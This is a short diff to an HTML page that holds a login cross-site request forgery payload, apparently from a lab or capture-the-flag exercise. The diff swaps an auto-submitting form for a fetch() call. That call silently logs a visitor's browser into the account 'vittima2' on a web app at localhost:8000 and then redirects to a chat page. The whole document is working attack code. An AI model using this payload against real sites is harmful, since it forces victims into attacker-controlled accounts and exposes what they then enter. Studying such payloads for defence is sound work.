@@ -2,12 +2,16 @@
 <html>
 <body>
 <div class="message">x</div>
-<form id="f" method="POST" action="http://localhost:8000/login?next=%2Fchat%2F49" target="_self">
-  <input name="username" value="vittima2">
-  <input name="password" value="vittima2">
-</form>
 <script>
-  document.getElementById('f').submit();
+fetch('http://localhost:8000/login', {
+  method: 'POST',
+  credentials: 'include',
+  mode: 'no-cors',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'username=vittima2&password=vittima2'
+}).then(() => {
+  window.location = 'http://localhost:8000/chat/49';
+});
 </script>
 </body>
 </html>
